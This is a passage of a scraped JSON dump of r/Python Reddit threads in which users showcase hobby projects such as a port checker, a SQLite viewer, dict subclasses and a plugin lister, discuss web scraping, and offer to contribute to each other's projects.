̵̛̛̛̫͖̫̠͍͇̠̹̗͇̺̰̀̔̅̈́͑̉̑͗͋͂̓͌̈́̀͛̂͑̍̈́̇͊͂͗̔̾͒̃̽́̏̇͐͊̏̏̆̅͌̄͗̉̈́͂́̑͒̋̆̾̽̓̑̇͌̃̓͐̃́͊̀͛̓̎̽̓̉̃̀́̊̂̈́̑͆́̀͐̈͋́̐͑̈̍̍̍̓̀̆̂̑͐́͌̾̀̃̀̓͑͘̕̕̚̚͘̚͘̕͠͝͠͠͠͝͝͠͠͠ţ̴̡̨̨̡̢̡̢̨̨̢̡̦̪̪̥̘̻̹̪̞̱͔͙͙̰̣͍̰̖̲̜͕̝̰̰̟͙͎̠̼̣̩͓̖̳̟͕̖͉̦̤͍̦̣̟̟͍͈̦̩̝̙͈̥͎̣͚̪̭̠̞͇͈̟͎̞̮͍̞̭̼͕̰̟̭̹̥͍̬͍͔̮̳͔̮̟̝̮̣̘̬͙͕̞̼̮͙̓̋̽̅͌͐̿́̓̎̈͋̾͛͆͐̊̌̊̿́̂̓͗͌̀̉͗͆͂͊̀̒̔͒̅͊͊̊̎̂̈͒͌̂̿̄͂̋̇͑́͌͊̋̌̈́̂̃̅̎̋̓̿͌̒͊̑̃̐̓̎̄̂̈́̈́̆͛̓̾͑̊̍̎̓̐̂͊̇̕̕͘̚̕͜͜͜͜͠͝͝͝͠͝͝ͅͅͅh̵̢̨̧̡̢̧̨̡̧̛͈̱̺̘͈̰̬̬̝̦̘̰̠̭̲͓͇͙̲͍̭͙̭͔̲̖̰̠̘̩̫̯̤̻̬̩̪̹̳͕͓̬̭̩̯̻̙͔̹͚͎̟̲͈̝͍͇͍̥͈̮̯̞̫͎͇͇͕̳̻̙͚̠͎̩̖̘̗̬̹̜̲̗̩͕̳̭̻̳̯̠̝̓̒́̓̒͌̿͂̀̑̅̔̾̍̌͐͋͐̀̋̿̈́͋̈́́͋̚̚̕͘͜͜͜͝͝͝͝ͅͅi̸̢̧̨̨̢̨̢̩̣̱̤͉̱͚͎̳̞͍̖͕̖̗̠̣̤̩̠̱͔͙̩̝̼̞̖̥̣̘̻͎͖̜̟̤̞̪̲̤̤̪̫̘̥̘̹̞̳͙̞̟͇̭͙͍͇̯̟͚͙̼̙̫͍͓͓̲̳͈͓͔̤̱̙̰͈͖̜̣̪̝̤͎̘̳͓̹̞͉͖̞͈͔̯̠̺̞̥̬̬͎͗̓̄͜͜͜ͅͅͅş̶̨̩̙̭̣̺͇̟̗͖͙̺̭͇͙̲̖͍̰̰̱͍̫̻̰͉͓͎̻̳͈͍̬͎͕̬̻̮̻̣̲̞̦̜̮͕͚̙̩̱̝̥̬̻͈́̂͌͛̓̌͆͜͜ . I'm a machine learning engineer working on modernizing a legacy tool used for text generation. LLM type stuff. One of the pieces in this system is a \"tokenizer\", which is responsible for turning strings into sequences of numbers that essentially map to \"words\" in the private language of the AI model. This procedure needs to be inverted on the other side of the process, converting the outputs from the AI's private vocabulary back into text. There are several parts of this system that \"accumulate\" sequences of tokens to mitigate issues that can raise UnicodeDecodeErrors. One of these systems is exhibiting unexpected behavior causing it to never stop accumulating. That's the latest headache, anyway."
                        }
                    ]
                }
            ]
        },
        {
            "author": "3nc0d3d_",
            "score": "2",
            "content": "I just finished scraping all of the NASCAR results for all 3 series. I’m learning Python, so this has been a lot of fun. I used Selenium to scrape and Polars to clean it. I do biostats for my day job so now I’d like to apply some feature engineering and variable reduction. My goal is to see if I can tune a ML algorithm to return a semi-decent accuracy if for nothing other than to keep learning. FWIW I typically code in R so I’ve been looking across the street for some time now and just started my Python journey in late-March. If anyone knows of similar F1 or other racing projects with repos that would be relevant, I would greatly appreciate it. Also, if anyone wants to join me, I’m open to learning and sharing :)",
            "replies": [
                {
                    "author": "PurepointDog",
                    "score": "2",
                    "content": "Woot polars!"
                }
            ]
        },
        {
            "author": "Ice_Ant_7828",
            "score": "2",
            "content": "nothing big and interesting as yours but today, as a beginner, I finished my SQL Password Manager. This simple password manager allows you to securely store usernames and passwords by encrypting them before saving them mysql table. Check it out here: SQL Password Manager. Would love any feedback or suggestions!"
        },
        {
            "author": "_byl",
            "score": "2",
            "content": "I created a Python program which uses GPT (4o) to automatically generate Anki cards for language learning for any language of your choice. Cards include translations, example sentences and explanations for a set of vocab words, exportable to Anki or any spreadsheet. Check out the code: https://github.com/brylee10/anki-language-gpt Some notable features include: Can generate cards for any world language Easy to set up and customize: you can get your first set of cards created within minutes, and all the code is open source All card fields are auto generated with OpenAI's newest model, GPT-4o It's fast - you can create 500+ cards in <30 seconds. The generator supports outputting cards to Anki, Google Sheets, Excel or any other source which imports spreadsheets"
        },
        {
            "author": "raisethealuminumwage",
            "score": "1",
            "content": "Trying to find a way to transpose certain data from an OPCUA device to an excel datasheet. Sockets keep giving me issues."
        },
        {
            "author": "baltarius",
            "score": "1",
            "content": "Opened yesterday 2 dating discord servers. The key of those are the bots made with python. They allow users to create profile cards and check people's card. Also have automated system like internal mailing system and a few functions to entertain people. Thanks python, SQLite3 and all the libraries I'm using to make it happen."
        },
        {
            "author": "General-Carrot-4624",
            "score": "1",
            "content": "A trading terminal that supports multiple exchanges, if anyone wants to collaborate, let me know"
        },
        {
            "author": "ResidentSpecialist20",
            "score": "1",
            "content": "I’ve been reading about Jane street’s use of incremental and how they use it, so I’m going to try and build my own version in Python We have a big project at work coming up for real time risk generation and I’m thinking something like incremental would be useful in that scenario"
        },
        {
            "author": "Name_einfuegen_",
            "score": "1",
            "content": "An automation utility for Wayland. Similar to Autokey. Still needs a lot of work though."
        },
        {
            "author": "hellalosses",
            "score": "1",
            "content": "open source personal finance dashboard"
        },
        {
            "author": "Pedro41RJ",
            "score": "1",
            "content": "Eight puzzle solver https://pastebin.com/XXq93zmb"
        },
        {
            "author": "Cuzeex",
            "score": "1",
            "content": "FastAPI solution for a web services internal backend API A little spice here is also to deploy it as AWS Lambda functions More spice adds the AWS CDK for the whole thing which by request has to be written in TypeScript..."
        },
        {
            "author": "FuturesBrightDavid",
            "score": "1",
            "content": "I'm working on some improvements to my Trim Template engine which gives Python the templating goodness from Ruby's Slim HTML template syntax. I'm planning to make an additional package which imports this into Django in an elegant way. If anyone has suggestions on an approach for this idea, please reach out."
        },
        {
            "author": "Chronic_sleepiness",
            "score": "1",
            "content": "I'm currently working on a makeshift todo list (it's really bad, but it is helping me learn about lists). I am having a bit of trouble, but its fun!"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dkqdsg",
    "post_score": "1",
    "post_time": "Friday, June 21, 2024 at 3:00:42 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Obliterative_hippo",
            "score": "1",
            "content": "How's everyone been handling the Numpy 2.0 release? I've been dealing with issues on Python 3.12 when using Dask."
        }
    ]
},
{
    "post_author": "FriendlyCrafter",
    "post_id": "1dtrm1f",
    "post_score": "0",
    "post_time": "Tuesday, July 2, 2024 at 8:31:44 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Bite -a sqlite viewer made in python",
    "media": [
        "https://github.com/NhSimple/bite"
    ],
    "post_content": "https://github.com/NhSimple/bite\nHello, I have made a github repository that allows you to read sort and search through database files written in sqlite. At the moment its features are a little bare but I am working to add more stuff.\nThis project is more of a toy project as I wanted to learn more about working with databases for a few private projects.",
    "comments": []
},
{
    "post_author": "Goldtom",
    "post_id": "gs7xdb",
    "post_score": "4158",
    "post_time": "Thursday, May 28, 2020 at 6:06:43 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "A Python GUI for uninstalling the default Windows 10 apps.",
    "media": [
        "https://i.redd.it/r51f4jvzti151.png",
        "https://preview.redd.it/r51f4jvzti151.png?auto=webp&s=a962b410231387fcd499d8513c9a6e73fb6c167b"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Goldtom",
            "score": "267",
            "content": "Github repo (Reuploaded because previous was accidentally posted as link, not image) I know there are a lot of similar apps already, but I wanted to make my own, plus it was intended to be used only by myself, as I reinstall Windows for friends often. But as it got more polished, I thought people might like it. Edit: The PyDebloatX installer is now available on Github releases.",
            "replies": [
                {
                    "author": "NymphCore",
                    "score": "71",
                    "content": ""
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "155",
            "content": ""
        },
        {
            "author": "ppeters0502",
            "score": "69",
            "content": "Remove solitaire??? What do you want to remove next, my oxygen??!!!"
        }
    ]
},
{
    "post_author": "szperajacy-zolw",
    "post_id": "1dpnc09",
    "post_score": "152",
    "post_time": "Thursday, June 27, 2024 at 12:43:15 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Those dicts you probably needed at some point",
    "media": [
        "https://github.com/jakubgajski/those_dicts"
    ],
    "post_content": "Hi everyone!\nI have created a dependency-free package those-dicts that provides some subclasses of dict with a twist: BatchedDict(no, it is not ChainMap from collections), GraphDict and TwoWayDict. At some point I have personally needed those and finally decided to materialize them. Of course there are some specialized libraries, that can provide similar functionality, but they are very bloated. And those-dicts are just dicts.\nhttps://github.com/jakubgajski/those_dicts\nIf you have some dict with a twist in mind, please open a PR or describe it to me, so I will implement it in the free time :) The only requirements for an idea to fit is: it is a dict (conforms to vast majority of dict interface) and is dependency free.\njust: pip install those-dicts",
    "comments": [
        {
            "author": "pellep",
            "score": "216",
            "content": "Didn’t expect unsolicited dicts today, and yet here we are.",
            "replies": [
                {
                    "author": "AmericasNo1Aerosol",
                    "score": "19",
                    "content": "*unsolicited dict picks?"
                },
                {
                    "author": "Mysterious-Rent7233",
                    "score": "7",
                    "content": "Flavoured!"
                }
            ]
        },
        {
            "author": "pentagon",
            "score": "106",
            "content": "I feel like there must be a way to integrate an image into a dictionary.  Just so you could have a dictPic",
            "replies": [
                {
                    "author": "Cuzeex",
                    "score": "3",
                    "content": "I smiled loudly"
                },
                {
                    "author": "japes28",
                    "score": "-1",
                    "content": "there are many ways to incorporate an image into a dictionary, depending on what you want out of your dict_pic"
                }
            ]
        },
        {
            "author": "entropomorphic",
            "score": "10",
            "content": "Another one I like to use is the transactional dict, or sometimes called a journal dict. It additionally stores another dict of changes made, and a set of deletes made, that are checked first before returning the \"real\" data. The updates can be wiped to revert to the base state, or committed to set a new base state. It's handy for app settings that can be reverted to default, and for API result objects so PATCH requests can be generated easily."
        },
        {
            "author": "chestnutcough",
            "score": "20",
            "content": "How about a hashable dict?",
            "replies": [
                {
                    "author": "PercussiveRussel",
                    "score": "41",
                    "content": "frozendict"
                }
            ]
        },
        {
            "author": "TheHollowJester",
            "score": "9",
            "content": "I opened this mostly because the idea sounded cool, though I thought I'd be like \"I probably won't use this\". Turns out, I probably will use those-dicts, I definitely remember a couple of situations where I wanted a TwoWayDict. And I can imagine a use for BatchedDict and GraphDict. Nice job dude, this is very cool, you are also cool, and lastly your nickname is dope :D"
        },
        {
            "author": "pithed",
            "score": "6",
            "content": "I love me some twisted dicts. Seriously i could have used this a couple days ago but actually working through my own solution really taught me a thing or two. Mostly that I am bad at rolling my own solutions."
        }
    ]
},
{
    "post_author": "Knockoutpie1",
    "post_id": "1dkmwzy",
    "post_score": "0",
    "post_time": "Friday, June 21, 2024 at 12:23:57 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Web scraper for protein prices ",
    "media": [],
    "post_content": "Hey everyone, looking for some input.\nFor work I’ve worked on web scraping for prices to see if my components are adequately priced on the internet compared to competitors.\nI can use this for protein prices as a personal project. I have experience now with Beautiful Soup, Selenium, and Excel Power BI.\nWhat route should I go?\nShould I only pull pricing from Amazon? Or should I do Amazon and the manufacturer site to see which is better pricing? Ideas would be great. Should be a fun project.\nIf I go with beautiful soup, there’s no UI and I can print all to terminal\nIf I use selenium, I can use UC to pass anti-bot measures and also print to terminal, but it will open a browser window for each price scrape.\nIf I use excel power BI, I’ll just load data to a worksheet and pricing will update at the price of a button.",
    "comments": [
        {
            "author": "dowcet",
            "score": "20",
            "content": "Scraping should be an absolute last resort.  Amazon has an API. If you do need to scrape, Selenium should also be last resort, but you can use headless mode if you don't want the window to open.",
            "replies": [
                {
                    "author": "DoNotFeedTheSnakes",
                    "score": "6",
                    "content": "What this guy said. Also if you scrape, remember to check the robots.txt file before doing so.",
                    "replies": [
                        {
                            "author": "TOMOHAWK35",
                            "score": "1",
                            "content": "Check for what?",
                            "replies": [
                                {
                                    "author": "DoNotFeedTheSnakes",
                                    "score": "3",
                                    "content": "The rules to follow, the pages to exclude. https://www.cloudflare.com/learning/bots/what-is-robots-txt/"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "Aromatic_Two6353",
                    "score": "1",
                    "content": "Thank you! This is very useful to me"
                },
                {
                    "author": "Knockoutpie1",
                    "score": "0",
                    "content": "Thanks I’ll start there!"
                }
            ]
        },
        {
            "author": "nicholashairs",
            "score": "1",
            "content": ""
        }
    ]
},
{
    "post_author": "Suspicious_Arm8709",
    "post_id": "1dso9ao",
    "post_score": "22",
    "post_time": "Monday, July 1, 2024 at 11:52:00 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "GitVis -- visualize your git commits locally",
    "media": [
        "https://github.com/aldinash/gitvis",
        "https://pypi.org/project/gitvis/"
    ],
    "post_content": "What my project does\nGitVis is a tool written in Python that allows you to visualize your local commits for the last 6 months from a given date. The visualization is done in a manner similar to GitHub and GitLab, providing a familiar and intuitive interface.\nGitHub: https://github.com/aldinash/gitvis\nPyPi: https://pypi.org/project/gitvis/\nTarget Audience\nI built this project for fun\nComparison\nThere is an implementation of this tool in Go. I decided to create a similar project in Python and continue developing a CLI for visualizing the local Git workflow.",
    "comments": [
        {
            "author": "RedEyed__",
            "score": "1",
            "content": "It looks cool!"
        },
        {
            "author": "PresentFriendly3725",
            "score": "1",
            "content": "Nice"
        },
        {
            "author": "thadeshammer",
            "score": "1",
            "content": "Great work! What a cool project."
        }
    ]
},
{
    "post_author": "homelander_30",
    "post_id": "1dm4h72",
    "post_score": "14",
    "post_time": "Saturday, June 22, 2024 at 11:16:12 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Is anyone here looking for a developer to contribute to your personal projects? ",
    "media": [],
    "post_content": "I guess the title explains it all, I'm looking for some personal projects to work or contribute on and would be really helpful if anyone is looking for a dev. I did look upon some open-source projects but they were too advanced and out of scope for me so I just wanna start small and learn.",
    "comments": [
        {
            "author": "riklaunim",
            "score": "45",
            "content": "Trying to contribute to something you don't use and know won't work. And you don't have to have contributions as a check mark for something. If anything it will come with time."
        },
        {
            "author": "ArabicLawrence",
            "score": "15",
            "content": "If you like/know Magic: The Gathering, I have a few beginner projects I would like to refactor and improve: https://github.com/ElLorans/Best-MTG-Deck https://github.com/ElLorans/GoldfishScrape",
            "replies": [
                {
                    "author": "martelx-",
                    "score": "2",
                    "content": "This is neat, recently into magic and not so recently into programming. Is there a collection of open source magic projects somewhere?",
                    "replies": [
                        {
                            "author": "ArabicLawrence",
                            "score": "4",
                            "content": "here you are: https://github.com/search?q=magic%20the%20gathering&type=repositories"
                        }
                    ]
                },
                {
                    "author": "homelander_30",
                    "score": "2",
                    "content": "I will look into this, thank you"
                },
                {
                    "author": "MrFavorable",
                    "score": "3",
                    "content": "Me as a Magic player and a student going for computer software technology is extremely interested in these.",
                    "replies": [
                        {
                            "author": "ArabicLawrence",
                            "score": "4",
                            "content": "glad to hear that! if you like any project, you can open a discussion on github or directly fork and submit a pull request"
                        }
                    ]
                }
            ]
        },
        {
            "author": "StoryRadiant1919",
            "score": "11",
            "content": "look into code for america. they may have just the thing. gl",
            "replies": [
                {
                    "author": "yrubooingmeimryte",
                    "score": "4",
                    "content": "Is \"gl\" the opposite of \"ngl\"?"
                }
            ]
        },
        {
            "author": "ThreeChonkyCats",
            "score": "9",
            "content": "This is advice I give often. Almost daily in Real Life. Find a project on github that interests you. Don't just jump in and start smashing out code Look over the projects history and ALL of the code Mark and add comments Work out unit tests, start adding those in, for they are inoffensive, fuck nothing up and demonstrates you understand WTF is going on in that section of code Read over the Issues and Discussions (perhaps the Wiki) This gains you a bit of trust. From there, it grows. I also have advice about here you might live and how to help local businesses. It will earn you a bit of money as of day 1, but this might not be what you seek."
        },
        {
            "author": "ImClearlyDeadInside",
            "score": "8",
            "content": "Any project worth contributing to is going to be complex. You might have better luck reaching out to the owner of the repository for open-source projects you actually use and letting them know your experience and your willingness to learn. They might be willing to give you a rundown on how the project works and how you can help. Usually, these owners have a LONG list of things they need to do that they may not have the time or energy to do themselves."
        },
        {
            "author": "TheSayAnime",
            "score": "6",
            "content": "https://github.com/cosmicoppai/LiSA"
        },
        {
            "author": "XXXYinSe",
            "score": "3",
            "content": "Making a tableau dashboard for new drug approvals in biotech/pharma. An actual web app/website would be nice for my portfolio but I’m not interested in developing it myself. DM me if interested"
        },
        {
            "author": "johntellsall",
            "score": "3",
            "content": "Shotglass: view large codebases graphically I have a project where code is analyzed and plotted. The point is to use our human brains to see patterns. Ex: if code is colored with function complexity, potential bugs will pop out. If code is colored by how much test coverage it has, then entire files that are under-tested will stick out. I have ~20 different analysis and plotting programs... but no user interface. Example: this is the Nginx codebase (200 K lines of code). Each source code file is a colored block. Each tag (function) in code is variations of the file color. You can easily see which functions are larger than others https://github.com/johntellsall/shotglass/blob/main/april/images/tags-nginx.png?raw=true A user interface for Shotglass would let us: choose different codebases hover over each file to see what it is choose different plotting focus. Ex: does color mean complexity, or code coverage, or number of Git committers? Here's some more codebases and interesting things discovered while plotting them: https://github.com/johntellsall/shotglass/tree/main Feel free to DM."
        },
        {
            "author": "kuzmovych_y",
            "score": "3",
            "content": "I have an opensource project that helps with managing Google calendar. It's used by people, so you'd have some real impact :) There are few issues on it ranging from very simple (literally moving one constant definition to another file) to more complex. Here's the repo: https://github.com/kuzmoyev/google-calendar-simple-api Here are the issues: https://github.com/kuzmoyev/google-calendar-simple-api/issues Here's \"how to contribute\": https://github.com/kuzmoyev/google-calendar-simple-api/blob/master/CONTRIBUTING.md If you're interested, feel free to ask me questions in dm (or discord), pick any issue, open a PR."
        }
    ]
},
{
    "post_author": "PR0T064",
    "post_id": "goldxf",
    "post_score": "4126",
    "post_time": "Friday, May 22, 2020 at 6:26:51 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "A tool that copies a selected area of your screen, not as a picture, but as pastable text (GitHub in comments)",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "PR0T064",
            "score": "373",
            "content": "Source Code Not a particularly complex program, as the OCR backend uses Google's Tesseract engine, but I hope it can be useful!",
            "replies": [
                {
                    "author": "netbie_94",
                    "score": "48",
                    "content": "Nice, OP."
                }
            ]
        },
        {
            "author": "youarestronk",
            "score": "153",
            "content": "",
            "replies": [
                {
                    "author": "w8eight",
                    "score": "75",
                    "content": ""
                }
            ]
        },
        {
            "author": "float7",
            "score": "35",
            "content": "That's pretty cool"
        }
    ]
},
{
    "post_author": "jrbourbeau",
    "post_id": "1dketsw",
    "post_score": "2",
    "post_time": "Thursday, June 20, 2024 at 6:44:16 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Python on Cloud GPUs",
    "media": [
        "https://docs.coiled.io/user_guide/pytorch.html"
    ],
    "post_content": "Hi All,\nI wanted to try to speed up some Python code with a GPU recently and was pretty shocked at how difficult it is to properly set up and configure things. I have lots of experience in the PyData space, but am definitely not a cloud devops expert.\nSo some colleagues and I wrote a decorator that automatically sets up a cloud VM, runs the decorated function, and returns the function’s result back locally to my laptop. Here’s an example that trains a PyTorch model on an NVIDIA A10 GPU on AWS.\nThe Coiled Function API is nice because I didn’t have to build any Docker images, muck around in the AWS console, or do anything special to set up a cloud GPU. That said, there are definitely tradeoffs here. We optimized for privacy and no standing costs, so it takes ~1-2 minutes to fully spin up VMs (no warm pool of VMs waiting). We also only run on AWS/GCP/Azure so this doesn’t help with on-prem workloads.\nI’m definitely biased as I work at Coiled, but think this is a simple way to run Python on cloud hardware (especially for folks without a lot of cloud experience). \nI’m curious to hear from folks here. Do you have a favorite way to run Python code on the cloud? What do you like about your current setup? For example, ergonomics, performance, something else?",
    "comments": [
        {
            "author": "iliasreddit",
            "score": "1",
            "content": "I build a similar internal library for my company. Do you support AzureML?",
            "replies": [
                {
                    "author": "jrbourbeau",
                    "score": "2",
                    "content": "We use Azure VM Scale Sets (VMSS) to manage cloud VMs. We don't integrate with Azure ML directly, but do see lots of users with ML use cases (for example, PyTorch training, experiment tracking). Are there specific AzureML services that you’re interested in?"
                }
            ]
        },
        {
            "author": "MuffisAwesome",
            "score": "1",
            "content": "Is it possible to run coil on my own hardware",
            "replies": [
                {
                    "author": "jrbourbeau",
                    "score": "2",
                    "content": ""
                }
            ]
        },
        {
            "author": "Novel-Durian-6170",
            "score": "1",
            "content": "Hyperstack.cloud is super quick and easy to use"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dt8170",
    "post_score": "0",
    "post_time": "Tuesday, July 2, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "SAV_NC",
    "post_id": "1dptsb5",
    "post_score": "42",
    "post_time": "Thursday, June 27, 2024 at 6:17:20 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Check for Open Ports using Python",
    "media": [
        "https://github.com/slyfox1186/script-repo/blob/main/Python3/Networking/port_checker.py"
    ],
    "post_content": "What my Project Does\nThis Python script is designed to scan specified ports on one or more target IP addresses to determine if they are open or closed. It uses multi-threading to perform the scans efficiently and outputs the results in a color-coded tabulated format for easy reading. The script provides the ability to scan either a single port or a range of ports on multiple targets. Additionally, the script now supports writing the results to an output file if specified.\nTarget Audience\nThis project is intended for:\nNetwork administrators who need to check the status of ports on various devices within a network.\nSecurity professionals who want to perform network reconnaissance to identify open ports that could be potential security risks.\nIT support staff who need to troubleshoot connectivity issues by verifying open ports.\nEnthusiasts and learners who are interested in network security and port scanning techniques.\nFeatures\nMulti-threaded for efficient scanning\nSupports scanning multiple targets\nSupports single port or port range\nColor-coded output for easy reading\nVerbose mode for detailed output\nHandles unreachable IP addresses and lists them in a separate tabulated format\nOption to specify an output file to store the scan results\nRequirements\nPython 3.6+\ncolorama library\ntabulate library\nInstallation\nBefore running the script, ensure you have the required libraries installed. You can install them using pip:\npip install colorama tabulate\nSourcing the script\nYou can download the script here on GitHub.\nUsage\nRun the script with the required arguments to perform a port scan.\nCommand Line Arguments\n-t, --targets: Target host(s) to scan, separated by space (required)\n-p, --ports: Port or port range to scan. Use format start-end for a range or a single port number (required)\n-P, --protocol: Specify protocol: tcp, udp, or both (optional) (default: both)\n-v, --verbose: Enable verbose mode to display closed or filtered ports (optional)\n-o, --output: File to store the scan results (optional)\nExamples\nExample 1: Scan a Single IP for a Single Port\n./port_checker.py -t 192.168.1.1 -p 80\nExample 2: Scan Multiple IPs for a Single Port\n./port_checker.py -t 192.168.1.1,192.168.1.2 -p 80\nExample 3: Scan a Single IP for a Range of Ports\n./port_checker.py -t 192.168.1.1 -p 80-100\nExample 4: Scan Multiple IPs for a Range of Ports with Verbose Mode\n./port_checker.py -t 192.168.1.1,192.168.1.2 -p 80-100 -v\nExample 5: Scan a Range of IP Addresses for a Range of Ports\n./port_checker.py -t 192.168.1.1-192.168.1.10 -p 80-100\nExample 6: Scan Multiple IP Ranges for a Single Port with Both Protocols\n./port_checker.py -t 192.168.1.1-192.168.1.10,192.168.1.20-192.168.1.30 -p 80 -P both\nExample 7: Scan a Single IP for a Single Port using TCP Protocol with Verbose Mode\n./port_checker.py -t 192.168.1.1 -p 80 -P tcp -v\nExample 8: Scan a range of IPs using CIDR notation and ports 1-100 using TCP protocol\n./port_checker.py -t 192.168.1.0/24 -p 1-100 -P tcp\nExample 9: Scan Multiple IPs and output results to a file\n./port_checker.py -t 192.168.1.1,192.168.1.2 -p 80 -o results.txt\nExample Output\nScanning a Single IP for a Range of Ports\n./port_checker.py -t 192.168.1.1 -p 80-100\nOutput:\nScanning for open: 192.168.1.1 port 80 - 100\n\nScanning completed.\n\nResults for IP: 192.168.1.1\n+-------+----------+-------------------+\n| Port  | Protocol | Status            |\n+-------+----------+-------------------+\n| 80    | both     | open              |\n| 81    | both     | closed or filtered|\n| 82    | both     | closed or filtered|\n| ...   | ...      | ...               |\n+-------+----------+-------------------+\n\nUnreachable IP Addresses:\n+--------+---------------+\n| Number |    Address    |\n+--------+---------------+\n|   1    | 192.168.50.3  |\n|   2    | 192.168.50.4  |\n|   3    | 192.168.50.5  |\n|   4    | 192.168.50.25 |\n+--------+---------------+\nScript Details\nMain Function\nmain(targets, ports, num_threads, protocol, verbose, output_file): Orchestrates the threading and scanning process, and handles writing results to the output file if specified.\nPort Scan Function\nport_scan(ip, port, protocol, verbose): Attempts to connect to a specified port on a given IP address and logs the result.\nThread Function\nthreader(protocol, verbose): Manages the queue and processes scan tasks.\nArgument Parsing\nget_args(): Parses command line arguments for targets, ports, protocol, verbose mode, and output file.\nOutput\nprint_results(output_file): Displays the scan results in a formatted table, lists unreachable IP addresses, and writes results to the specified output file if provided.\nError Handling\nThe script includes error handling for:\nInvalid IP addresses\nInvalid port formats\nConnection timeouts and errors\nThis ensures that users are informed of any issues and the scan can proceed or terminate gracefully as necessary.",
    "comments": [
        {
            "author": "MithrilRat",
            "score": "39",
            "content": "Interesting project, from a coding perspective. But, why not use NMAP?",
            "replies": [
                {
                    "author": "vinnypotsandpans",
                    "score": "5",
                    "content": "Because NMAP is not python!!! Haha",
                    "replies": [
                        {
                            "author": "Greasy_Dev",
                            "score": "1",
                            "content": "Knowing when and when not to use python is wisdom. Unless your portfolio could use more projects then I take my original statement back. Show what you can do."
                        },
                        {
                            "author": "MithrilRat",
                            "score": "1",
                            "content": "I'm with Greasy_Dev on this. Sometimes, you just need to chose your battles, or maybe even do some basic research into what could meet your needs. If one of my engineers showed me that they'd try to re-invent the wheel, especially on something as difficult as this project, they would be disciplined for wasting time."
                        }
                    ]
                }
            ]
        },
        {
            "author": "zurtex",
            "score": "19",
            "content": "Many years ago I made one of these when the trading desk I was working for at the time was moving office. A previous office move caused production issues because the network configuration wasn't exactly the same and we lost access to certain ports that were used between the GUI on the traders desk and the order manager on server in the CoLo. And this was missed until we moved (and we had assurances it was a functionally identical network). I kicked it off Friday afternoon after the market had shutdown in the new and the old office, to then compare on Monday if there were any differences that looked like a problem. Anyway Monday morning I arrived to a very angry email from the network security team, and I had to a lot of back and forth with how I'd \"acquired\" a port scanner and what \"approvals\" I had got and what process I needed to follow in the future if I ever did it again. Moral of the story is, it's a fun exercise, teaches you about networking, and introduces you to your network security team. P.S, I think I used asyncio to improve the performance and learn more about async, but my memory is fuzzy at this point.",
            "replies": [
                {
                    "author": "ekbravo",
                    "score": "8",
                    "content": "That’s a very good point, in my place port scanning is expressly forbidden. But I like the project though. Good work, OP."
                }
            ]
        },
        {
            "author": "jerzerk",
            "score": "6",
            "content": "I would suggest adding information on whether it's a TCP or a UDP port. That will allow you to make distinct \"closed\" or \"filtered\" verdicts for TCP ports.",
            "replies": [
                {
                    "author": "SAV_NC",
                    "score": "2",
                    "content": "I added this ability. Thanks."
                }
            ]
        },
        {
            "author": "bpg2001bpg",
            "score": "-2",
            "content": "Any thoughts on adding cidr notation? How about ipv6? How fast is it? Is it multi-threaded?",
            "replies": [
                {
                    "author": "SAV_NC",
                    "score": "4",
                    "content": "I have added this. See example 8 in the post. If you read the post it states that 'Yes' the script is multithreaded."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Ok.",
            "replies": [
                {
                    "author": "paranoid-alkaloid",
                    "score": "1",
                    "content": "Ok."
                }
            ]
        }
    ]
},
{
    "post_author": "fesch2",
    "post_id": "1dm01o1",
    "post_score": "19",
    "post_time": "Saturday, June 22, 2024 at 7:53:30 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "discover-plugins - track which plugins are installed into your python environment",
    "media": [
        "https://pypi.org/project/discover-plugins/",
        "https://github.com/felixscherz/discover-plugins"
    ],
    "post_content": "What my project does\ndiscover-plugins is a simple CLI tool that lets you list and filter plugins entrypoints installed into a python environment.\nI recently had to track down a bug that I ultimately resulted from a plugin I had installed into my environment. To my surprise, there was no easy way to list which kind of plugins were installed, so I decided to build my own tool.\nTarget Audience\ndiscover-plugins is intended as a debugging tool for those times when you are not quite sure which plugins are currently part of your python environment.\nInstallation\npipx install discover-plugins\nUsage\nFind all installed plugins related to pytest (the relevant group name is pytest11):\ndiscover-plugins --group pytest11\nThe tool defaults to use the first python interpreter on your path, you can optionally specify which interpreter to use with the --interpreter flag.\nThe output will list all entrypoints belonging to the pytest11 group. For example, if you had installed a single pytest plugin (pytest-aws-apigateway) the output would look like this:\n{\n  \"pytest11\": [\n    {\n      \"name\": \"pytest_httpx\",\n      \"group\": \"pytest11\",\n      \"value\": \"pytest_httpx\"\n    },\n    {\n      \"name\": \"anyio\",\n      \"group\": \"pytest11\",\n      \"value\": \"anyio.pytest_plugin\"\n    },\n    {\n      \"name\": \"pytest-aws-apigateway\",\n      \"group\": \"pytest11\",\n      \"value\": \"pytest_aws_apigateway.plugin\"\n    }\n  ]\n}\nLinks\nLink to GitHub: https://github.com/felixscherz/discover-plugins\nPyPI: https://pypi.org/project/discover-plugins/\nLet me know if the tool helped you out!\nCheers!",
    "comments": [
        {
            "author": "IAmTarkaDaal",
            "score": "32",
            "content": "What exactly do you mean by \"plugin\" here?",
            "replies": [
                {
                    "author": "ThiefMaster",
                    "score": "17",
                    "content": "See, that's why I posted my other comment :) Pretty much nobody calls it \"plugins\""
                },
                {
                    "author": "silent_guy1",
                    "score": "1",
